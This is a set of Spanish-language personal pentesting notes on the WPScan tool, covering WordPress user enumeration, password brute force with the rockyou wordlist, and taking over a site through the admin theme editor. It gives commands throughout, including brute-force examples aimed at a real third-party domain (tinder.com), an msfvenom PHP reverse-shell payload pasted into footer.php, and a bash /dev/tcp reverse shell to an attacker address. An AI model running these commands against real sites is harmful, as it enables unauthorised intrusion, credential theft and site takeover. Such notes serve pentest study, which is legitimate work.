---

---
-----------

#web #wordpress #reconocimiento #herramientas

----------------

La herramienta **WpScan** es una herramienta utilizada para enumerar los gestores de contenidos de [[WordPress - Definicion y Concepto]]

---
### Ataque formulario login 

Generalmente el formulario de login se llama *wp-login.php* , lo que haremos será usar la ruta hasta el directorio en donde se encuentra este recurso, es decir, si la ruta completa es *http://192.168.20.1/blog/wp-login.php* , nosotros solo usaremos la herramienta de wp-scan hasta */blog* de la siguiente manera:

```bash
wpscan --url http://192.168.20.1/blog --enumerate u,vp  # Comando para enumerar usuarios y plugins vulnerables de uso con metaesploit

# Despues de encontrar un usuario procedemos a realizar fuerza bruta para la constraseña de la siguiente manera:

wpscan --url http://192.168.20.1/blog --passwords /usr/share/wordlist/rockyou.txt --usernames <UsuarioEncontrado>
```



---
### Comandos Generales

Su modo de uso es muy sencillo, podríamos realizar un escaneo a modo de traza con el siguiente código en bash:

```bash
wpscan --url https://tinder.com
```

Si quisiéramos enumerar usuarios validos potenciales existentes podríamos usar el siguiente comando: 

```bash
wpscan --url https://tinder.com --enumerate u
```

Otra de las utilidades de esta app es su capacidad de realizar ataques de fuerza bruta se ejecuta con el siguiente comando:

```bash
wpscan --url https://tinder.com -U xrl3y -P /usr/share/wordlists/rockyou.txt
```

Cabe destacar que este procedimiento también se puede ejecutar de forma manual abusando de la ruta **xmrlpc.php**[^2] , siendo necesario para ello crear un script en bash o en python. 

---
### Dashboard Administrador del WordPress

- Debemos buscar algun apartado para subir archivos y ejecutar un [[File Upload]], en todo caso si no lo hay, entraremos al apartado de *Appereance - Theme Editor* como a continuación:

![[Pasted image 20251021192501.png]]

- Procedemos a buscar un fichero php para ejecución de código, en este caso el mas común es *footer.php* que es el gestor principal como se muestra a continuación: 

*También esta el 404.php que es cuando no encuentra el directorio , este se puede ejecutar mediante el directorio de wp-content/jdbusbdsubdsd asemejando a un recurso desconocido haciendo que se envié la reverse shell*

![[Pasted image 20251021192701.png]]

- Ahi podremos copiar codigo php, podríamos generar una reverse shell como en el apartado de [[2. Reverse Shell]] , sin embargo para la escalada de privilegios es mejor establecer una sesion con metaesploit, por lo tanto nos creamos un payload de la siguiente manera:

```bash
msfvenom -p php/reverse_php LHOST=10.8.100.91 LPORT=443 -f raw > pwned.php
cat pwned.php

# Copiamos todo el codigo del archivo y lo pegarmos en el footer.php del wordpress
# Espichamos el boton de upload para actualizar el codigo
# Ya solo recargando la pagina principal (http://192.168.20.16/blog) y estando en escucha en meterpreter ganariamos acceso
# Para no perder la conexion, una vez ganado el acceso deberiamos enviarnos una shell por netcat a otro puerto con:

MaquinaAtacante>
				nc -nlvp 4444

MaquinaVictima >
				bash -c 'bash -i >& /dev/tcp/<IpAtacante>/4444 0>&1'
```




-----------

## Referencias 

---------

[^1]: Enlace al proyecto de GitHub [Enlace](https://github.com/wpscanteam/wpscan)
[^2]: Enlace al proyecto de GitHub [[xmrlpc]]

